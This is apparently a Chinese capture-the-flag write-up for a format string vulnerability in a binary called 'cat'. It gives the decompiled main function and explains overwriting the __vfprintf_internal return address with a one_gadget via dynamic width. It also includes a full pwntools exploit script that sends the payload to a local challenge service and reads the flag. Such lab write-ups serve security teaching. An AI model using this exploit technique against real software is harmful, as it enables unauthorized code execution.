程序很简单，将stdout重定位到`/dev/null`然后又格式化字符串漏洞，比较典型的动态宽度利用

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  _QWORD v3[4]; // [rsp+10h] [rbp-20h] BYREF
  __int64 savedregs; // [rsp+30h] [rbp+0h] BYREF

  v3[3] = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  v3[2] = 0LL;
  v3[0] = v3;
  v3[1] = &savedregs - 35;
  puts("Guess what I found ? ");
  cat();
  puts("Can you recreate this art cat ?");
  puts("try a try ");
  freopen("/dev/null", "w", stdout);
  read(0, s, 0x49uLL);
  printf(s);
  exit(0);
}
```

动调可以发现栈上已经在v3[1]写入了`__vfprintf_internal`的返回地址，利用格式化字符串的动态宽度+偏移将`__vfprintf_internal`的返回地址改为one_gadget即可   (`__vfprintf_internal`原本返回地址是printf+offset，只需要计算好偏移)

###### 完整exp

```python
from pwn import *		
context(log_level='debug',os='linux',arch='amd64')
pwnfile = './cat'
#io=process(pwnfile)
io=remote('127.0.0.1',32768)

# 0xebc85 - 0x29d90		13
# 0xebc85 - 0x29e40		33

pay = b'%*13$d%794357c%9$n'

io.sendlineafter("try a try \n",pay)

sleep(0.4)
io.send(b'cat flag 1>&2\n')	#重定向输出
io.interactive()
```

